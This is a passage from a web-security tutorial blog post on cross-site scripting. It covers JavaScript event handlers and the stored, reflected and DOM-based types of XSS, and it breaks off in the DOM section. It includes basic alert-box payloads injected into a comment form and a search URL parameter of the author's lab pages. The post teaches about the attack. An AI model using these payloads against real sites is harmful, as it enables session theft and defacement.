<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/website-hacking/" rel="category tag">Website Hacking</a></span>            </div>
            <h1 class="post-title entry-title">Comprehensive Guide on Cross-Site Scripting (XSS)</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/comprehensive-guide-on-cross-site-scripting-xss/" rel="bookmark"><time class="entry-date published" datetime="2020-08-12T17:26:19+00:00">August 12, 2020</time><time class="updated" datetime="2025-05-25T16:32:05+00:00">May 25, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <p class="MsoNoSpacing"><span style="color: #000000;"><i style="mso-bidi-font-style: normal;">Have you ever welcomed with a pop-up, when you visit a web-page or when you hover at some specific text? Imagine, if these pop-ups become a vehicle, which thus delivers malicious payload into your system or even capture up some sensitive information.</i> Today, in this article, we’ll take a tour to <b style="mso-bidi-font-weight: normal;">Cross</b>–<b style="mso-bidi-font-weight: normal;">Site</b> <b style="mso-bidi-font-weight: normal;">Scripting </b>and would learn how an attacker executes malicious JavaScript codes over at the input parameters and generates such pop-ups, in order to deface the web-application or to hijack the active user’s session.</span></p>
<h3 class="MsoNoSpacing"><span style="color: #800000;"><span style="font-size: 14pt;">Table of Content</span></span></h3>
<ul>
<li><span style="color: #000000;">What is JavaScript?</span></li>
<li><span style="color: #000000;">JavaScript Event Handlers</span></li>
<li><span style="color: #000000;">Introduction to Cross-Site Scripting (XSS)</span></li>
<li><span style="color: #000000;">Impact of Cross-Site Scripting</span></li>
<li><span style="color: #000000;">Types of XSS</span>
<ul>
<li><span style="color: #000000;">Reflected XSS</span></li>
<li><span style="color: #000000;">Stored XSS</span></li>
<li><span style="color: #000000;">OM-based XSS</span></li>
</ul>
</li>
<li><span style="color: #000000;">Cross-Site Scripting Exploitation</span>
<ul>
<li><span style="color: #000000;">Credential Capturing</span></li>
<li><span style="color: #000000;">Cookie Capture</span></li>
<li><span style="color: #000000;">Fuzzing</span>
<ul>
<li><span style="color: #000000;">Burpsuite</span></li>
<li><span style="color: #000000;">XSSer</span></li>
</ul>
</li>
</ul>
</li>
<li><span style="color: #000000;">Mitigation Steps</span></li>
</ul>
<h3 class="MsoNoSpacing"><span style="color: #800000;"><span style="font-size: 14pt;">What is JavaScript?</span></span></h3>
<p class="MsoNoSpacing"><span style="color: #000000;">A dynamic web-application stands up over three pillars i.e. <b style="mso-bidi-font-weight: normal;">HTML – </b>which determines up the complete structure, <b style="mso-bidi-font-weight: normal;">CSS – </b>describes its overall look and feel, and the <b style="mso-bidi-font-weight: normal;">JavaScript – </b>which simply adds powerful interactions to the application such as alert-boxes, rollover effects, dropdown menus and other things.</span></p>
<p class="MsoNoSpacing"><span style="color: #000000;">So, developers use JavaScript as the programming language of the web, and they consider it to be one of the most popular scripting languages, as about 93% of the total websites run with JavaScript due to some of its major features i.e.</span></p>
<ul>
<li><span style="color: #000000;">It is easy to learn.</span></li>
<li><span style="color: #000000;">It helps to build interactive web-applications.</span></li>
<li><span style="color: #000000;">The browser interprets the only programming language instead of displaying it.</span></li>
<li><span style="color: #000000;">It is flexible, as it simply gets blends up with the HTML codes.</span></li>
</ul>
<h3 class="MsoNoSpacing"><span style="color: #800000;"><span style="font-size: 14pt;">JavaScript Event Handlers</span></span></h3>
<p class="MsoNoSpacing"><span style="color: #000000;">When JavaScript code is incorporated into an HTML page, it will “react” to certain occurrences, such as:</span><br/>
<span style="color: #000000;">It is an event when the page loads. An event is also created when a button is clicked by the user. Additional examples include resizing a window, closing a window, and pushing any key. Thus, certain event-handlers are responsible for managing such events.</span></p>
<h4 class="MsoNoSpacing"><span style="color: #000000;"><span style="font-size: 14.0pt; mso-bidi-font-size: 11.0pt;">Onload</span></span></h4>
<p class="MsoNoSpacing"><span style="color: #000000;">Javascript uses the <b style="mso-bidi-font-weight: normal;">onload</b> <b style="mso-bidi-font-weight: normal;">function</b> to load an object over on a web page. </span></p>
<p class="MsoNoSpacing"><em><span style="color: #000000;">For example, I want to generate an alert for user those who visit my website; I will give the following JavaScript code.</span></em></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic"> &lt;body onload=alert(‘Welcome to Hacking Articles’)&gt;</pre>
<p class="MsoNoSpacing"><span style="color: #000000;">So whenever the body tag loads up, an alert will pop up with the following text </span><b style="mso-bidi-font-weight: normal;"><i>“Welcome to Hacking Articles”</i></b><span style="color: #000000;">. Here the </span><b style="mso-bidi-font-weight: normal;">loading of the body tag is an “event”</b><span style="color: #000000;"> or a happening and </span><b style="mso-bidi-font-weight: normal;">“onload” is an event handler</b><span style="color: #000000;"> which decides what action should happen on that event.</span></p>
<h4 class="MsoNoSpacing"><span style="color: #000000;"><span style="font-size: 14pt;">Onmouseover</span></span></h4>
<p class="MsoNoSpacing"><span style="color: #000000;">With the Onmouseover event handler, when a user moves his cursor over a specific text, the embedded JavaScript code executes.</span></p>
<p class="MsoNoSpacing"><em><span style="color: #000000;"> For example, let us understand the following code:</span></em></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">&lt;a onmouseover=alert(“50% discount”)&gt;surprise&lt;/a&gt;</pre>
<p class="MsoNoSpacing"><span style="color: #000000;"><i style="mso-bidi-font-style: normal;">Now when the user moves his cursor over the <b style="mso-bidi-font-weight: normal;">surprise</b> the displayed text on the page, an alert box will pop up with 50% discount.</i></span></p>
<p class="MsoNoSpacing"><span style="color: #000000;">Similarly, there are many JavaScript event handlers, which defines what event should occur for such type of actions like a scroll down, or when an image fails to load etc.</span></p>
<table class="MsoNormalTable" style="width: 688px; height: 251px;" border="0" width="0" cellpadding="0">
<tbody>
<tr style="mso-yfti-irow: 0; mso-yfti-firstrow: yes;">
<td style="width: 94.5pt; padding: .75pt .75pt .75pt .75pt;" width="129">
<p class="MsoNormal" style="margin-bottom: .0001pt; line-height: normal;"><span style="color: #000000;"><b>onclick:</b></span></p>
</td>
<td style="width: 396.75pt; padding: .75pt .75pt .75pt .75pt;" width="526">
<p class="MsoNormal" style="margin-bottom: .0001pt; line-height: normal;"><span style="color: #000000;">Use this to invoke JavaScript upon clicking (a link, or form boxes)</span></p>
</td>
</tr>
<tr style="mso-yfti-irow: 1;">
<td style="width: 94.5pt; padding: .75pt .75pt .75pt .75pt;" width="129">
<p class="MsoNormal" style="margin-bottom: .0001pt; line-height: normal;"><span style="color: #000000;"><b>onload:</b></span></p>
</td>
<td style="width: 396.75pt; padding: .75pt .75pt .75pt .75pt;" width="526">
<p class="MsoNormal" style="margin-bottom: .0001pt; line-height: normal;"><span style="color: #000000;">Use this to invoke JavaScript after the page or an image has finished loading</span></p>
</td>
</tr>
<tr style="mso-yfti-irow: 2;">
<td style="width: 94.5pt; padding: .75pt .75pt .75pt .75pt;" width="129">
<p class="MsoNormal" style="margin-bottom: .0001pt; line-height: normal;"><span style="color: #000000;"><b>onmouseover</b></span></p>
</td>
<td style="width: 396.75pt; padding: .75pt .75pt .75pt .75pt;" width="526">
<p class="MsoNormal" style="margin-bottom: .0001pt; line-height: normal;"><span style="color: #000000;">Use this to invoke JavaScript if the mouse passes by some link</span></p>
</td>
</tr>
<tr style="mso-yfti-irow: 3;">
<td style="width: 94.5pt; padding: .75pt .75pt .75pt .75pt;" width="129">
<p class="MsoNormal" style="margin-bottom: .0001pt; line-height: normal;"><span style="color: #000000;"><b>onmouseout</b></span></p>
</td>
<td style="width: 396.75pt; padding: .75pt .75pt .75pt .75pt;" width="526">
<p class="MsoNormal" style="margin-bottom: .0001pt; line-height: normal;"><span style="color: #000000;">Use this to invoke JavaScript if the mouse goes pass some link</span></p>
</td>
</tr>
<tr style="mso-yfti-irow: 4; mso-yfti-lastrow: yes;">
<td style="width: 94.5pt; padding: .75pt .75pt .75pt .75pt;" width="129">
<p class="MsoNormal" style="margin-bottom: .0001pt; line-height: normal;"><span style="color: #000000;"><b>onunload</b></span></p>
</td>
<td style="width: 396.75pt; padding: .75pt .75pt .75pt .75pt;" width="526">
<p class="MsoNormal" style="margin-bottom: .0001pt; line-height: normal;"><span style="color: #000000;">Use this to invoke JavaScript right after someone leaves this page.</span></p>
</td>
</tr>
</tbody>
</table>
<h3 class="MsoNoSpacing"><span style="color: #000000;"><span style="font-size: 14pt;"><span style="color: #800000;">Introduction to Cross-Site Scripting (XSS)</span></span></span></h3>
<p class="MsoNoSpacing"><span style="color: #000000;"><b style="mso-bidi-font-weight: normal;">C</b>ross-<b style="mso-bidi-font-weight: normal;">S</b>ite <b style="mso-bidi-font-weight: normal;">S</b>cripting often abbreviated as <b style="mso-bidi-font-weight: normal;">“XSS” </b>is a client-side code injection attack where malicious <b style="mso-bidi-font-weight: normal;">scripts</b> <b style="mso-bidi-font-weight: normal;">are</b> <b style="mso-bidi-font-weight: normal;">injected</b> <b style="mso-bidi-font-weight: normal;">into</b> <b style="mso-bidi-font-weight: normal;">trusted</b> <b style="mso-bidi-font-weight: normal;">websites</b>. Attackers exploit web applications with unsanitized or unvalidated input parameters to send malicious JavaScript codes to a different end user. The end user’s browser has no way to know that the script should not be trusted, and will thus execute the script.</span></p>
<p class="MsoNoSpacing"><span style="color: #000000;">In this attack, the attacker does not directly target the users through a payload, although they exploit the XSS vulnerability by inserting a malicious script into a web page that appears to be a genuine part of the website. So, when any user visits that website, the XSS-inflicted web page delivers the malicious JavaScript code directly to his browser without his knowledge.</span></p>
<p class="MsoNoSpacing"><span style="color: #000000;">Confused with what’s happening? Let’s make it more clear with the following example.</span></p>
<p class="MsoNoSpacing"><span style="color: #000000;"><i style="mso-bidi-font-style: normal;">Consider a web application that allows its users to set-up their <b style="mso-bidi-font-weight: normal;">“brief description”</b> over at their profile, which is thus <b style="mso-bidi-font-weight: normal;">visible</b> <b style="mso-bidi-font-weight: normal;">to</b> <b style="mso-bidi-font-weight: normal;">everyone</b>. Now the attacker notice that the description field is not properly validating the inputs, so he injects his malicious script into that<b style="mso-bidi-font-weight: normal;"> field.</b></i></span></p>
<p class="MsoNoSpacing"><span style="color: #000000;"><i style="mso-bidi-font-style: normal;">Now, whenever the visitor views the attacker’s profile, the code get’s automatically executed by the browser and therefore it captures up the authenticated cookies and over on the other side, the attacker would have the victim’s active session.</i></span></p>
<p class="MsoNoSpacing"><span style="color: #000000;"><i style="mso-bidi-font-style: normal;"> <img decoding="async" src="https://1.bp.blogspot.com/-6AvAH8VzwpY/XzQCBsgi_vI/AAAAAAAAnAk/f-8jYuFZkv4rxDYZmkmXnztceobi4-wQACLcBGAsYHQ/s1600/1.png"/></i></span></p>
<h3 class="MsoNoSpacing"><span style="color: #800000;"><span style="font-size: 14pt;">Impact of Cross-Site Scripting</span></span></h3>
<p class="MsoNoSpacing"><span style="color: #000000;">From the last decay, <b style="mso-bidi-font-weight: normal;">C</b>ross-<b style="mso-bidi-font-weight: normal;">S</b>ite <b style="mso-bidi-font-weight: normal;">Sc</b>ripting has managed its position in the <b style="mso-bidi-font-weight: normal;">OWASP Top10 list,</b> as it is one of the most crucial and the most widely-used attack method on the internet.</span></p>
<p class="MsoNoSpacing"><span style="color: #000000;">Therefore, over with this vulnerability, the attacker could:</span></p>
<ul>
<li><span style="color: #000000;">Capture and access the user’s authenticated session cookies.</span></li>
<li><span style="color: #000000;">Uploads a phishing page to lure the users into unintentional actions.</span></li>
<li><span style="color: #000000;">Redirects the visitors to some other malicious sections.</span></li>
<li><span style="color: #000000;">Expose the user’s sensitive data.</span></li>
<li><span style="color: #000000;">Manipulates the structure of the web-application or even defaces it.</span></li>
</ul>
<p class="MsoNoSpacing"><span style="color: #000000;">However, XSS has been reported with a <b style="mso-bidi-font-weight: normal;">“CVSS Score” </b>of<b style="mso-bidi-font-weight: normal;"> “6.1” </b>as on <b style="mso-bidi-font-weight: normal;">“Medium” Severity </b>under </span></p>
<p class="MsoNoSpacing" style="margin-left: .5in; text-indent: -.25in; mso-list: l0 level1 lfo4;"><span style="color: #000000;"><!-- [if !supportLists]--><span style="font-family: Symbol;"><span style="mso-list: Ignore;">·<span style="font: 7.0pt 'Times New Roman';">         </span></span></span><!--[endif]--><b style="mso-bidi-font-weight: normal;">CWE-79</b>: Improper Neutralization of Input During Web Page Generation (‘Cross-site Scripting’)</span></p>
<p class="MsoNoSpacing" style="margin-left: .5in; text-indent: -.25in; mso-list: l0 level1 lfo4;"><span style="color: #000000;"><!-- [if !supportLists]--><span style="font-family: Symbol;"><span style="mso-list: Ignore;">·<span style="font: 7.0pt 'Times New Roman';">         </span></span></span><!--[endif]--><b style="mso-bidi-font-weight: normal;">CWE-80</b>: Improper Neutralization of Script-Related HTML Tags in a Web Page (Basic XSS)</span></p>
<h3 class="MsoNoSpacing"><span style="color: #800000;"><span style="font-size: 14pt;">Types of XSS</span></span></h3>
<p class="MsoNoSpacing"><span style="color: #000000;">Up till now, you might be having a clear vision with the concept of <b style="mso-bidi-font-weight: normal;">JavaScript</b> and <b style="mso-bidi-font-weight: normal;">XSS </b>and its major consequences. So, let’s continue down on the same road and break this XSS into three main types as –</span></p>
<ol>
<li><span style="color: #000000;">Stored XSS</span></li>
<li><span style="color: #000000;">Reflected XSS</span></li>
<li><span style="color: #000000;">DOM-based XSS</span></li>
</ol>
<h4 class="MsoNoSpacing"><span style="color: #000000;"><span style="font-size: 14pt;">Stored</span><span style="font-size: 14pt;"> XSS</span> </span></h4>
<p class="MsoNoSpacing"><span style="color: #000000;"><b style="mso-bidi-font-weight: normal;">“Stored</b> <b style="mso-bidi-font-weight: normal;">XSS”</b> often termed as <b style="mso-bidi-font-weight: normal;">“<i style="mso-bidi-font-style: normal;">Persistent XSS</i>” </b>or <b style="mso-bidi-font-weight: normal;"><i style="mso-bidi-font-style: normal;">“Type I”</i></b><i style="mso-bidi-font-style: normal;">,</i> <span style="mso-spacerun: yes;"> </span>as over through this vulnerability the injected malicious script gets permanently stored inside the web application’s database server and the server further drops it out back, when the user visits the respective website.</span></p>
<p class="MsoNoSpacing"><span style="color: #000000;">However, this happens in a way as -. <i style="mso-bidi-font-style: normal;">when the client clicks or hovers a particular infected section, the injected JavaScript will get executed by the browser as it was already into the application’s database.</i> Therefore this attack does not require any phishing technique to target its users.</span></p>
<p class="MsoNoSpacing"><span style="color: #000000;">The most common example of <strong><span style="font-family: 'Calibri',sans-serif; mso-ascii-theme-font: minor-latin; mso-hansi-theme-font: minor-latin; mso-bidi-font-family: 'Times New Roman'; mso-bidi-theme-font: minor-bidi;">Stored XSS</span></strong> is the <em><b><span style="font-family: 'Calibri',sans-serif; mso-ascii-theme-font: minor-latin; mso-hansi-theme-font: minor-latin; mso-bidi-font-family: 'Times New Roman'; mso-bidi-theme-font: minor-bidi;">“comment option”</span></b></em> in the blogs, which allow any user to enter his feedback as in the form of comments for the administrator or other users.</span></p>
<p class="MsoNoSpacing"><span style="color: #000000;">Let’s carry this up by considering an example:</span></p>
<p class="MsoNoSpacing"><span style="color: #000000;">A web-application is asking its user to submit their feedback, as there on its webpage it is having two input fields- one for the name and other for the comment.</span></p>
<p class="MsoNoSpacing"><span style="color: #000000;"> <img decoding="async" src="https://1.bp.blogspot.com/-J7C5_FqhOXU/XzQCOuehHVI/AAAAAAAAnAo/S9zPHxBjKCwTSqph227lGupxddvNRmiZwCLcBGAsYHQ/s1600/5.png"/></span></p>
<p class="MsoNoSpacing"><span style="color: #000000;">Now, whenever the user hits up the <b style="mso-bidi-font-weight: normal;">submits</b> button, his entry gets stored into the database. To make it more clear, I’ve called up the database table on the screen as:</span></p>
<p class="MsoNoSpacing"><span style="color: #000000;"> <img decoding="async" src="https://1.bp.blogspot.com/-EJQTtrZnLmA/XzQCeJnrCJI/AAAAAAAAnAw/of-3AlW-in8NTvD9asUl-Kj43gkL1o-zQCLcBGAsYHQ/s1600/6.png"/></span></p>
<p class="MsoNoSpacing"><span style="color: #000000;">Here, the developer trusts his users and <b style="mso-bidi-font-weight: normal;">hadn’t placed any validations over at the fields</b>. So this loophole was encountered by the attacker and therefore he took advantage of it, as – instead of submitting the feedback, he <b style="mso-bidi-font-weight: normal;">commented</b> his <b style="mso-bidi-font-weight: normal;">malicious</b> <b style="mso-bidi-font-weight: normal;">script</b>.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">&lt;script&gt;alert("Hey!! This website belongs to Hacking Articles")&lt;/script&gt;</pre>
<p class="MsoNoSpacing"><span style="color: #000000;">From the below screenshot, you can see that the attacker got success, as the web-application reflects with an alert pop-up.</span></p>
<p class="MsoNoSpacing"><img decoding="async" src="https://1.bp.blogspot.com/-3uccL0Fvm6o/XzQClwPqPeI/AAAAAAAAnA4/vmuJsoJObJoQbx6NoRvNkcDsgtjYLbfhQCLcBGAsYHQ/s1600/7.png"/></p>
<p class="MsoNoSpacing"><span style="color: #000000;">Now, back on the database, you can see that the table has been updated with <b style="mso-bidi-font-weight: normal;">Name </b>as <b style="mso-bidi-font-weight: normal;">“Ignite” </b>and the <b style="mso-bidi-font-weight: normal;">Feeback </b>field is empty, this clears up that the attacker’s script had been injected successfully. </span></p>
<p class="MsoNoSpacing"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-SugH65NfZMQ/XzQCujIa4NI/AAAAAAAAnBA/OnGtZcscu6cs8rcyjw-4CXjM9yH8QViXACLcBGAsYHQ/s1600/9.png"/></span></p>
<p class="MsoNoSpacing"><span style="color: #000000;">So let’s switch to another browser as a different user and would again try to submit genuine feedback.</span></p>
<p class="MsoNoSpacing"><img decoding="async" src="https://1.bp.blogspot.com/-TbqpsTgXO3g/XzQC4YDC8iI/AAAAAAAAnBI/xxu1rYPk4-EYnoA95MDSe6PrmlLW9NbBgCLcBGAsYHQ/s1600/10.0.png"/></p>
<p class="MsoNoSpacing"><span style="color: #000000;">Now when we hit the <b style="mso-bidi-font-weight: normal;">Submit </b>button, our browser will execute the injected script and reflects it on the screen.</span></p>
<p class="MsoNoSpacing"><span style="color: #000000;"> <img decoding="async" src="https://1.bp.blogspot.com/-V1HYL-WLfiw/XzQDCrh8TXI/AAAAAAAAnBQ/J8vXgA8wu2QdxYT8RIEx-EVa3_X9A7TNgCLcBGAsYHQ/s1600/10.png"/></span><b style="mso-bidi-font-weight: normal;"><u/></b></p>
<h4 class="MsoNoSpacing"><span style="color: #000000;"><span style="font-size: 14pt;">Reflected</span><span style="font-size: 14pt;"> XSS</span></span></h4>
<p class="MsoNoSpacing"><span style="color: #000000;">The <b style="mso-bidi-font-weight: normal;">Reflected</b> <b style="mso-bidi-font-weight: normal;">XSS</b> also termed as <b style="mso-bidi-font-weight: normal;">“Non-Persistence XSS” </b>or <b style="mso-bidi-font-weight: normal;"><i style="mso-bidi-font-style: normal;">“Type II”</i></b>, occurs when the web application responds immediately on user’s input without validating what the user entered, this can lead an attacker to inject browser executable code inside the single HTML response. It is termed <strong><span style="font-family: 'Calibri',sans-serif; mso-ascii-theme-font: minor-latin; mso-hansi-theme-font: minor-latin; mso-bidi-font-family: 'Times New Roman'; mso-bidi-theme-font: minor-bidi;">“non-persistent”</span></strong> as the malicious script <b style="mso-bidi-font-weight: normal;">does not get stored inside the web-server’s database</b>, <i style="mso-bidi-font-style: normal;">thus the attacker needs to send the malicious link through phishing in order to trap the user.</i></span></p>
<p class="MsoNoSpacing"><span style="color: #000000;">Reflected XSS is the most common and thus can be easily found over at the <b style="mso-bidi-font-weight: normal;">“<strong><span style="font-family: 'Calibri',sans-serif; mso-ascii-theme-font: minor-latin; mso-hansi-theme-font: minor-latin; mso-bidi-font-family: 'Times New Roman'; mso-bidi-theme-font: minor-bidi;">website’s search fields”</span></strong></b> where the attacker includes some arbitrary Javascript codes in the search textbox and, if the website is vulnerable, the web-page return up the event as was described into the script.</span></p>
<p class="MsoNoSpacing"><span style="color: #000000;">Reflect XSS is a major with two types:</span></p>
<p class="MsoNoSpacing" style="margin-left: .5in; text-indent: -.25in; mso-list: l11 level1 lfo10;"><span style="color: #000000;"><!-- [if !supportLists]--><span style="font-family: Wingdings; mso-fareast-font-family: Wingdings; mso-bidi-font-family: Wingdings;"><span style="mso-list: Ignore;">§<span style="font: 7.0pt 'Times New Roman';">  </span></span></span><!--[endif]--><b>Reflected XSS GET</b></span></p>
<p class="MsoNoSpacing" style="margin-left: .5in; text-indent: -.25in; mso-list: l11 level1 lfo10;"><span style="color: #000000;"><!-- [if !supportLists]--><span style="font-family: Wingdings; mso-fareast-font-family: Wingdings; mso-bidi-font-family: Wingdings;"><span style="mso-list: Ignore;">§<span style="font: 7.0pt 'Times New Roman';">  </span></span></span><!--[endif]--><b>Reflected XSS POST</b></span></p>
<p class="MsoNoSpacing"><span style="color: #000000;">To be more clear with the concept of Reflected XSS, let’s check out the following scenario.</span></p>
<p class="MsoNoSpacing"><span style="color: #000000;">Here, we’ve created a webpage, which thus permits up the user to search for a particular <b style="mso-bidi-font-weight: normal;">training course</b>.</span></p>
<p class="MsoNoSpacing"><span style="color: #000000;">So, when the user searches for <strong><span style="font-family: Calibri, sans-serif;">“Bug Bounty”</span></strong>, a message prompts back over on the screen as <em><b><span style="font-family: Calibri, sans-serif;">“You have searched for Bug Bounty.”</span></b></em></span></p>
<p class="MsoNoSpacing"><span style="color: #000000;"><b style="mso-bidi-font-weight: normal;"><i style="mso-bidi-font-style: normal;"> <em><span style="font-family: Calibri, sans-serif;"><span style="mso-spacerun: yes;"> <img decoding="async" src="https://1.bp.blogspot.com/-6KO7-VTT3Fk/XzQDMTif2WI/AAAAAAAAnBY/hm_VX1Q2htsNBbIN13QJUUIYuC0EdAsWwCLcBGAsYHQ/s1600/11.png"/></span></span></em></i></b></span></p>
<p class="MsoNoSpacing"><span style="color: #000000;">Thus, this instant response and the <b style="mso-bidi-font-weight: normal;">“search” </b>parameter in the URL shows up that, the page might be vulnerable to XSS and even the data has been requested over through the GET method. </span></p>
<p class="MsoNoSpacing"><span style="color: #000000;">So, let’s now try to generate some pop-ups by injecting Javascript codes over into this <b style="mso-bidi-font-weight: normal;">“search”</b> <b style="mso-bidi-font-weight: normal;">parameter</b> as</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">get.php?search=&lt;script&gt;alert("Welcome to hacking Articles!!")&lt;/script&gt;</pre>
<p class="MsoNoSpacing"><span style="color: #000000;">Great!!<b style="mso-bidi-font-weight: normal;"> </b>From the below screenshot, you can see that we got the alert reflected as <b style="mso-bidi-font-weight: normal;"><i style="mso-bidi-font-style: normal;">“Welcome to Hacking Articles!!”</i></b></span></p>
<p class="MsoNoSpacing"><img decoding="async" src="https://1.bp.blogspot.com/-GM99DQ3fKkA/XzQDU-Kf4HI/AAAAAAAAnBg/rTjMuvVp68kWHBX_kVYTvGFEX4TK9MfigCLcBGAsYHQ/s1600/12.png"/></p>
<p class="MsoNoSpacing"><span style="color: #000000;">Wonder why this all happened, let’s check out the following code snippet.</span></p>
<p class="MsoNoSpacing"><img decoding="async" src="https://1.bp.blogspot.com/-oKjP8ByPTkI/XzQDbEkZn5I/AAAAAAAAnBk/XbzVo5y8VYAY-6P1M4VOW79lWIrw5ZZngCLcBGAsYHQ/s1600/13.0.png"/></p>
<p class="MsoNoSpacing"><span style="color: #000000;">With the ease to reflect the <strong><span style="font-family: 'Calibri',sans-serif; mso-ascii-theme-font: minor-latin; mso-hansi-theme-font: minor-latin; mso-bidi-font-family: 'Times New Roman'; mso-bidi-theme-font: minor-bidi;">message</span></strong> on the screen, the developer didn’t set up any input validation over at the <b style="mso-bidi-font-weight: normal;">ignite function</b> and he simply <strong><span style="font-family: 'Calibri',sans-serif; mso-ascii-theme-font: minor-latin; mso-hansi-theme-font: minor-latin; mso-bidi-font-family: 'Times New Roman'; mso-bidi-theme-font: minor-bidi;">“echo”</span></strong> the <em><span style="font-family: 'Calibri',sans-serif; mso-ascii-theme-font: minor-latin; mso-hansi-theme-font: minor-latin; mso-bidi-font-family: 'Times New Roman'; mso-bidi-theme-font: minor-bidi;">“Search Message”</span></em> with <b style="mso-bidi-font-weight: normal;"><i style="mso-bidi-font-style: normal;">ignite($search)</i></b> through the <strong><span style="font-family: 'Calibri',sans-serif; mso-ascii-theme-font: minor-latin; mso-hansi-theme-font: minor-latin; mso-bidi-font-family: 'Times New Roman'; mso-bidi-theme-font: minor-bidi;">“$_GET”</span></strong> variable.</span></p>
<p class="MsoNoSpacing"><img decoding="async" src="https://1.bp.blogspot.com/-PWpXGxMrKQg/XzQDhANiaWI/AAAAAAAAnBs/xmcr8vE0Du8YIDEejDMOqYLNGhEPD6J7QCLcBGAsYHQ/s1600/13.1.png"/></p>
<h4 class="MsoNoSpacing"><span style="color: #000000;"><span style="font-size: 14pt;">DOM-Based</span><span style="font-size: 14pt;"> XSS</span></span></h4>
<p class="MsoNoSpacing"><span style="color: #000000;">The <b style="mso-bidi-font-weight: normal;">DOM</b>–<b style="mso-bidi-font-weight: normal;">Based</b> <b style="mso-bidi-font-weight: normal;">Cross</b>–<b style="mso-bidi-font-weight: normal;">Site</b> <b style="mso-bidi-font-weight: normal;">Scripting</b> is the vulnerability which appears up in a Document Object Model rather than in the HTML pages.</span></p>
<p class="MsoNoSpacing"><span style="color: #000000;">But what is this <b style="mso-bidi-font-weight: normal;"><i style="mso-bidi-font-style: normal;">Document Object Model</i></b>?</span></p>
<p class="MsoNoSpacing"><span style="color: #000000;">A <b style="mso-bidi-font-weight: normal;">DOM </b>or a <b style="mso-bidi-font-weight: normal;">D</b>ocument <b style="mso-bidi-font-weight: normal;">Ob</b>ject <b style="mso-bidi-font-weight: normal;">M</b>odel describes up the different web-page segments like –<span style="mso-spacerun: yes;">  </span>title, headings, tables, forms, etc. and even the hierarchical structure of an HTML page. Thus, this API increases the skill of the developers to produce and change HTML and XML documents as programming objects.</span></p>
<p class="MsoNoSpacing"><span style="color: #000000;">When an <b style="mso-bidi-font-weight: normal;">HTML</b> <b style="mso-bidi-font-weight: normal;">document</b> is loaded into a web browser, it becomes a <b style="mso-bidi-font-weight: normal;">“Document</b> <b style="mso-bidi-font-weight: normal;">Object”</b>.</span></p>
<p class="MsoNoSpacing"><span style="color: #000000;">However, this document object is the <b style="mso-bidi-font-weight: normal;">root</b> <b style="mso-bidi-font-weight: normal;">node</b> of the HTML documents and the <b style="mso-bidi-font-weight: normal;">“owner”</b> of all other nodes.</span></p>
<p class="MsoNoSpacing"><span style="color: #000000;"> <img decoding="async" src="https://1.bp.blogspot.com/-QKBc9wDIFig/XzQDoYIi1dI/AAAAAAAAnB0/WII8GvrWpUoH0fUcvE17dEHqsrhvLQuMwCLcBGAsYHQ/s1600/13.png"/></span></p>
<p class="MsoNoSpacing"><span style="color: #000000;">With the object model, JavaScript gets all the power it needs to create dynamic HTML:</span></p>
<ul>
<li><span style="color: #000000;">JavaScript can change all the HTML elements in the page</span></li>
<li><span style="color: #000000;">JavaScript can change all the HTML attributes in the page</span></li>
<li><span style="color: #000000;">JavaScript can change all the CSS styles in the page</span></li>
<li><span style="color: #000000;">JavaScript can remove existing HTML elements and attributes</span></li>
<li><span style="color: #000000;">JavaScript can add new HTML elements and attributes</span></li>
<li><span style="color: #000000;">JavaScript can react to all existing HTML events in the page</span></li>
<li><span style="color: #000000;">JavaScript can create new HTML events on the page</span></li>
</ul>
<p class="MsoNoSpacing"><span style="color: #000000;">Therefore DOM manipulation is itself is not a problem, but when JavaScript handles data insecurely in the DOM, thus it enables up various attacks.</span></p>
<p class="MsoNoSpacing"><span style="color: #000000;"><b style="mso-bidi-font-weight: normal;">DOM-based XSS </b>vulnerabilities usually arise when JavaScript takes data from an attacker-controllable <b style="mso-bidi-font-weight: normal;">source</b><i style="mso-bidi-font-style: normal;">, such as the URL</i>, and passes it to a <b style="mso-bidi-font-weight: normal;">sink (</b>a dangerous JavaScript function or DOM object <i style="mso-bidi-font-style: normal;">as eval()</i><b style="mso-bidi-font-weight: normal;">)</b> that supports dynamic code execution. </span></p>
<p class="MsoNoSpacing"><span style="color: #000000;"><i style="mso-bidi-font-style: normal;">This is quite different from <b style="mso-bidi-font-weight: normal;">reflected</b> and <b style="mso-bidi-font-weight: normal;">stored</b> <b style="mso-bidi-font-weight: normal;">XSS</b> because over in this attack, the developer cannot find the malicious script in HTML source code as well as in HTML response, it can be observed at execution time.</i></span></p>
<p class="MsoNoSpacing"><span style="color: #000000;">The DOM-Based XSS exploits these problems on the user’s local machines in this way:</span></p>
